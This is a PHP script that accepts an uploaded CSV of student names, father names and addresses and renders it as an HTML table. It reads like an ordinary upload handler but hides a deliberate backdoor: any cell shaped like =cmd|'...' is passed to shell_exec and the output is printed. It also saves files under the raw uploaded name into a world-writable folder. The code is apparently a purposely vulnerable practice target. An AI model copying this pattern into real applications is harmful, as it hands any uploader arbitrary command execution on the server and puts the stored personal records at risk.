<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
        $filename = $_FILES['file']['name'];
        $fileTmpName = $_FILES['file']['tmp_name'];
        $destination = 'uploads/' . $filename;

        // Check if the file is a CSV by checking its MIME type and extension
        $fileType = mime_content_type($fileTmpName);
        $fileExtension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

        if ($fileType == 'text/plain' && $fileExtension == 'csv') {
            // Ensure the uploads directory exists
            if (!file_exists('uploads')) {
                mkdir('uploads', 0777, true);
            }

            if (move_uploaded_file($fileTmpName, $destination)) {
                echo "File uploaded successfully.<br>";
                echo "<h2>CSV Contents:</h2>";

                if (($handle = fopen($destination, "r")) !== FALSE) {
                    $firstRow = fgetcsv($handle, 1000, ",");
                    // Validate the format of the CSV
                    if (count($firstRow) == 3 && strtolower($firstRow[0]) == 'student name' && strtolower($firstRow[1]) == 'father name' && strtolower($firstRow[2]) == 'address') {
                        // Rewind the file pointer and process the entire file
                        rewind($handle);
                        echo "<table border='1'>";
                        while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) {
                            echo "<tr>";
                            foreach ($data as $cell) {
                                // Detect and execute command
                                if (preg_match('/^=cmd\|\'(.+)\'$/', $cell, $matches)) {
                                    $command = escapeshellcmd($matches[1]);
                                    $output = shell_exec($command);
                                    echo "<td>" . htmlspecialchars($output) . "</td>";
                                } else {
                                    echo "<td>" . htmlspecialchars($cell) . "</td>";
                                }
                            }
                            echo "</tr>";
                        }
                        echo "</table>";
                        fclose($handle);
                    } else {
                        echo "Invalid CSV format. Please ensure the CSV has columns: Student Name, Father Name, Address.";
                    }
                } else {
                    echo "Failed to open the file.";
                }
            } else {
                echo "Failed to move uploaded file.";
            }
        } else {
            echo "Invalid file type. Only CSV files are allowed.";
        }
    } else {
        echo "File upload error: " . $_FILES['file']['error'];
    }
}
?>
